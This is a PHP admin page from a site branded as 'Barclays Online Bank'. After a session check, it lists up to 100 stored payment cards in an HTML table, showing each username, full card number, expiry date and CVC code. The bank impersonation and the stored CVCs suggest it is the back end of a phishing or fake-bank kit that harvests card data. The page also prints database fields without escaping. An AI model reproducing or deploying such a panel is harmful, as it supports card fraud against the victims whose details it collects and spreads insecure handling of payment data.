<?php
session_start();
include('../../library/library.php');
?>
<?php

if(!isset($_SESSION['admin_username']) ||
  $_SESSION['admin_username']=="") {
header("location:admin_login.php");
}
?>

 <?php
$title= "Barclays Online Bank - World Largest Bank";
$meta_key = "Barclays Online Bank";
$meta_desc = "We give the best banking experience for your financial growth";
  $dir="../../";
  menu($title, $meta_key, $meta_desc, $dir);
  ?>

<style>
tr:nth-child(odd){
	background-color:#f5f5f5;
	
}
tr:nth-child(even){
	background-color:#000066;
	color:#fff;
	
}
</style>

<br>
<br>
<?php
$data = array(0);
if(isset($_SESSION['tl_card'])){
	
	echo "<center><h3>". $_SESSION['tl_card']; 
	echo "</h3></center>";
}else{
//fetch the number of users
		 $dbhandle = new Db_conn();
		 $table_name = "card u";
		 $query_fields = array("field_names"=>array("count(card_id) as total_user"), "where"=>array("u.card_id >"), "data"=>$data);
		
		 $dbhandle->select_data($table_name, $query_fields);	   
		 $ttl_user = $dbhandle->return_sth()->fetch();
	 $num = $ttl_user['total_user'];

$_SESSION['tl_card'] = $num;
}
//UNSET($_SESSION['tl_card']);

if(isset($_GET)){
foreach($_GET as $key=>$value){
	
	if($key == "a_prev"){
		$order_by = "id ASC";
		$get_prev = $value;
		$get_next = $value;
		$data = array($get_next-10);
	}else{
		$order_by = "id ASC";
		$get_next = $value;
		$data = array($get_next);
		$get_prev = $value;
	}
}
}
/*
$table_name = "users";
$query_data = array("field_names"=>array("*"), "where"=>array("id >"), "data"=>$data, "limit"=>5 );
$select = new Select("localhost", "bit_data", "root", "");
$select->select_data($table_name, $query_data);
*/

    $db = new Db_conn();//instantiate database class
	$table_name = "card";
	$data = array(0);
		$select_fields = array("field_names"=>array("*"), "where"=>array("card_id >"), "data"=>$data, "limit"=>100);
		
		$db->select_data($table_name, $select_fields );//call select method
		//$customer_rq = $db->rows();

	
		echo '<center> <h3 class="headline_w">Card Details</h3> </center>
		<div class="table-responsive">
		<table class="table" border="0" width="100%" style="width:1100px;"><tbody><tr>
		<td class="td_head" width="200"><b>Username</b></td>
		<td class="td_head" width="200"><b>Amount</b></td>
        <td class="td_head" width="200"><b>Card Name</b></td>
        <td class="td_head" width="200"><b>Card No</b></td>
        <td class="td_head" width="200"><b>Epiry Date</b></td>
        <td class="td_head" width="400"><b>CVC</b></td>
        <td class="td_head" width="200"><b>Date</b></td>
        </tr>';


while($row = $db->return_sth()->fetch()){
	
		echo '<tr>
        <td class="item_ad"><b>' .$row['username']. '</b></td>
        <td class="item_ad"><b>' .$row['amount']. '</b></td>
        <td class="item_ad"><b>' .$row['card_name']. '</b></td>
        <td class="item_ad" width="200"><b>' .$row['card_no']. '</b></td>
        <td class="item_ad" width="200"><b>' .$row['exp_date']. '</b></td>
        <td class="item_ad" width="250"><b>' .$row['cvc_code']. '</b></td>
        <td class="item_ad" width="250"><b>' .$row['date']. '</b></td>
		</tr>';
	
	
	$_SESSION['next'] = $row['id'];
	$get_next = $row['id'];
}
echo'</table> </div><br>';
if($get_next > 5){
  //  print "&nbsp&nbsp&nbsp <a href='users/?a_prev=$get_next'> <button>Prev</button> </a>";
}
if($get_next != $_SESSION['tl_card']){
//print "&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp <a href='users/?a_nxt=$get_next'> <button>Next</button> </a>";
}


?> 


<?php
footer("../../");
?>